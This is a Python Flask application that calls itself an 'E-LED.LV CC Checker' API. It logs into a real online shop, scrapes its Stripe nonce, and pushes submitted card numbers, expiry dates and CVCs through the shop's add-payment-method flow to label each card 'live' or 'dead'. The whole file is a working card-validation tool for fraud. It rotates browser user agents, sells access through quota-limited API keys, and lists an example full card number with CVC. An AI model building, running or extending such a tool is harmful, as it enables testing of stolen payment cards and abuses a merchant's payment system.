from flask import Flask, request, jsonify
import requests
import re
import os
import time
import random
from datetime import datetime, timedelta
import logging

app = Flask(__name__)

# 🔧 CONFIGURATION
class Config:
    SITE_BASE = "https://e-led.lv"
    PAYMENT_PAGE = f"{SITE_BASE}/my-account/add-payment-method/"
    AJAX_URL = f"{SITE_BASE}/wp-admin/admin-ajax.php"
    LOGIN_URL = f"{SITE_BASE}/my-account/"
    STRIPE_KEY = "pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz"
    
    # Get credentials from environment variables
    USERNAME = os.getenv('ELED_USERNAME')
    PASSWORD = os.getenv('ELED_PASSWORD')

# 🔐 SESSION MANAGEMENT
class SessionManager:
    def __init__(self):
        self.session = requests.Session()
        self.last_refresh = None
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        ]
        
        self.setup_headers()

    def setup_headers(self):
        self.base_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': random.choice(self.user_agents),
        }

    def needs_refresh(self):
        if not self.last_refresh:
            return True
        return (datetime.now() - self.last_refresh) > timedelta(minutes=30)

    def login(self):
        try:
            print("🔄 Attempting to login...")
            
            if not Config.USERNAME or not Config.PASSWORD:
                print("❌ No credentials configured")
                return False
                
            response = self.session.get(
                Config.LOGIN_URL,
                headers=self.base_headers,
                timeout=10
            )
            
            if response.status_code != 200:
                return False
            
            login_nonce = self.extract_login_nonce(response.text)
            if not login_nonce:
                return False

            login_data = {
                'username': Config.USERNAME,
                'password': Config.PASSWORD,
                'woocommerce-login-nonce': login_nonce,
                '_wp_http_referer': '/my-account/',
                'login': 'Login'
            }

            login_headers = {
                **self.base_headers, 
                'content-type': 'application/x-www-form-urlencoded',
                'referer': Config.LOGIN_URL
            }
            
            response = self.session.post(
                Config.LOGIN_URL,
                data=login_data,
                headers=login_headers,
                timeout=10,
                allow_redirects=True
            )

            if response.status_code == 200 and any('wordpress_logged_in' in cookie.name for cookie in self.session.cookies):
                self.last_refresh = datetime.now()
                print("✅ Login successful")
                return True
            else:
                return False

        except Exception as e:
            print(f"❌ Login error: {e}")
            return False

    def extract_login_nonce(self, html):
        patterns = [
            r'name="woocommerce-login-nonce" value="([a-f0-9]+)"',
            r'woocommerce-login-nonce.*?value="([a-f0-9]+)"'
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None

    def ensure_valid_session(self):
        if self.needs_refresh():
            return self.login()
        return True

    def get_headers(self, extra_headers=None):
        headers = {**self.base_headers}
        if extra_headers:
            headers.update(extra_headers)
        return headers

# Initialize session manager
session_manager = SessionManager()

# 🔑 API KEY MANAGEMENT
class APIKeyManager:
    def __init__(self):
        self.keys = {
            "darkboy": {"used": 0, "limit": 1000, "last_reset": datetime.now()},
            "premium": {"used": 0, "limit": 5000, "last_reset": datetime.now()},
            "free": {"used": 0, "limit": 100, "last_reset": datetime.now()}
        }
    
    def authenticate(self, api_key):
        if api_key not in self.keys:
            return False
        
        key_data = self.keys[api_key]
        
        if (datetime.now() - key_data["last_reset"]) > timedelta(hours=24):
            key_data["used"] = 0
            key_data["last_reset"] = datetime.now()
        
        if key_data["used"] >= key_data["limit"]:
            return False
        
        key_data["used"] += 1
        return True

api_key_manager = APIKeyManager()

def luhn_check(card_number):
    try:
        card_number = str(card_number).replace(' ', '').replace('-', '')
        if not card_number.isdigit() or len(card_number) < 13:
            return False
            
        total = 0
        for i, digit in enumerate(reversed(card_number)):
            n = int(digit)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
            
        return total % 10 == 0
    except Exception:
        return False

def get_bin_info(card_number):
    try:
        card_clean = str(card_number).replace(' ', '').replace('-', '')
        if len(card_clean) < 6:
            return {"scheme": "Unknown", "type": "Unknown", "brand": "Unknown", "bank": "Unknown", "country": "Unknown"}
        
        bin_num = card_clean[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "scheme": data.get("scheme", "Unknown"),
                "type": data.get("type", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown")
            }
    except Exception:
        pass
    return {"scheme": "Unknown", "type": "Unknown", "brand": "Unknown", "bank": "Unknown", "country": "Unknown"}

def extract_nonce():
    if not session_manager.ensure_valid_session():
        return None
    
    try:
        headers = session_manager.get_headers()
        response = session_manager.session.get(
            Config.PAYMENT_PAGE,
            headers=headers,
            timeout=10
        )
        
        if response.status_code != 200:
            return None
        
        patterns = [
            r'"stripe_nonce":"([a-f0-9]{8,10})"',
            r'var wc_stripe_params = {[^}]*"nonce":"([a-f0-9]{8,10})"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
        
        return None
        
    except Exception as e:
        print(f"Nonce extraction error: {e}")
        return None

def create_stripe_payment_method(card_data):
    try:
        card_number, exp_month, exp_year, cvc = card_data
        
        stripe_data = {
            'type': 'card',
            'card[number]': card_number,
            'card[cvc]': cvc,
            'card[exp_year]': exp_year,
            'card[exp_month]': exp_month,
            'billing_details[address][country]': 'US',
            'key': Config.STRIPE_KEY,
        }
        
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': random.choice(session_manager.user_agents)
        }
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=15
        )
        
        if response.status_code == 200:
            data = response.json()
            return {'success': True, 'pm_id': data.get('id')}
        else:
            return {'success': False, 'error': f'Stripe Error {response.status_code}'}
            
    except Exception as e:
        return {'success': False, 'error': f'Stripe Exception: {str(e)}'}

def confirm_payment(pm_id, nonce):
    if not session_manager.ensure_valid_session():
        return {'success': False, 'error': 'Session invalid'}
    
    try:
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce
        }
        
        ajax_headers = session_manager.get_headers({
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'referer': Config.PAYMENT_PAGE
        })
        
        response = session_manager.session.post(
            Config.AJAX_URL,
            data=ajax_data,
            headers=ajax_headers,
            timeout=15
        )
        
        if response.status_code == 200:
            try:
                data = response.json()
                return {
                    'success': True,
                    'result': data.get('result'),
                    'messages': data.get('messages'),
                }
            except ValueError:
                return {'success': False, 'error': 'Invalid JSON response'}
        else:
            return {'success': False, 'error': f'AJAX HTTP Error: {response.status_code}'}
            
    except Exception as e:
        return {'success': False, 'error': f'AJAX Exception: {str(e)}'}

# 🌐 API ENDPOINTS
@app.route('/gateway=<gateway>/key=<api_key>/site=e-led.lv/cc=<path:cc_data>')
def check_cc_video_style(gateway, api_key, cc_data):
    start_time = time.time()
    
    if not api_key_manager.authenticate(api_key):
        return jsonify({
            "status": "error",
            "message": "Invalid API key or rate limit exceeded"
        }), 401
    
    if gateway != "autostripe":
        return jsonify({
            "status": "error", 
            "message": "Unsupported gateway"
        }), 400
    
    try:
        parts = cc_data.split('|')
        if len(parts) != 4:
            return jsonify({
                "status": "error",
                "message": "Invalid format: card|mm|yy|cvc"
            }), 400
        
        card_number, exp_month, exp_year, cvc = parts
        card_clean = str(card_number).replace(' ', '').replace('-', '')
        
        if not card_clean.isdigit():
            return jsonify({
                "status": "error",
                "message": "Card number must contain only digits"
            }), 400
            
        if len(card_clean) < 13 or len(card_clean) > 19:
            return jsonify({
                "status": "error",
                "message": "Invalid card number length"
            }), 400
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Invalid card data format: {str(e)}"
        }), 400
    
    if not luhn_check(card_clean):
        return jsonify({
            "status": "invalid",
            "message": "Luhn check failed",
            "card": card_clean[-4:],
            "bin_info": get_bin_info(card_clean),
            "time_taken": round(time.time() - start_time, 2)
        }), 200
    
    nonce = extract_nonce()
    if not nonce:
        return jsonify({
            "status": "error", 
            "message": "Cannot extract security nonce",
            "card": card_clean[-4:],
            "time_taken": round(time.time() - start_time, 2)
        }), 500
    
    card_data = [card_clean, exp_month, exp_year, cvc]
    stripe_result = create_stripe_payment_method(card_data)
    
    if not stripe_result['success']:
        return jsonify({
            "status": "dead",
            "message": stripe_result.get('error', 'Payment method creation failed'),
            "card": card_clean[-4:],
            "bin_info": get_bin_info(card_clean),
            "time_taken": round(time.time() - start_time, 2)
        }), 200
    
    ajax_result = confirm_payment(stripe_result['pm_id'], nonce)
    processing_time = round(time.time() - start_time, 2)
    
    if ajax_result['success']:
        result_status = ajax_result.get('result')
        if result_status == 'success':
            return jsonify({
                "status": "live",
                "message": "Card is LIVE and valid",
                "card": card_clean[-4:],
                "bin_info": get_bin_info(card_clean),
                "gateway": gateway,
                "site": "e-led.lv",
                "time_taken": processing_time
            }), 200
        else:
            return jsonify({
                "status": "dead",
                "message": ajax_result.get('messages', ['Card declined'])[0] if isinstance(ajax_result.get('messages'), list) else 'Card declined',
                "card": card_clean[-4:],
                "bin_info": get_bin_info(card_clean),
                "time_taken": processing_time
            }), 200
    else:
        return jsonify({
            "status": "error",
            "message": ajax_result.get('error', 'Confirmation failed'),
            "card": card_clean[-4:],
            "time_taken": processing_time
        }), 500

@app.route('/status')
def status():
    key_status = {}
    for key, data in api_key_manager.keys.items():
        key_status[key] = {
            "used": data["used"],
            "limit": data["limit"],
            "remaining": data["limit"] - data["used"]
        }
    
    return jsonify({
        "status": "online",
        "service": "E-LED.LV CC Checker",
        "session_valid": not session_manager.needs_refresh(),
        "has_credentials": bool(Config.USERNAME and Config.PASSWORD),
        "api_keys": key_status
    }), 200

@app.route('/')
def home():
    return jsonify({
        "message": "E-LED.LV CC Checker API",
        "version": "2.0",
        "usage": "/gateway=autostripe/key=darkboy/site=e-led.lv/cc=card|mm|yy|cvc",
        "example": "/gateway=autostripe/key=darkboy/site=e-led.lv/cc=5168404480081372|09|29|973"
    }), 200

# 🚀 INITIALIZATION
def initialize_system():
    print("🚀 Initializing E-LED.LV CC Checker...")
    
    if Config.USERNAME and Config.PASSWORD:
        print("🔑 Credentials found, attempting login...")
        if session_manager.login():
            print("✅ System initialized successfully!")
        else:
            print("❌ Initial login failed!")
    else:
        print("⚠️  Running without credentials - limited functionality")

if __name__ == '__main__':
    initialize_system()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
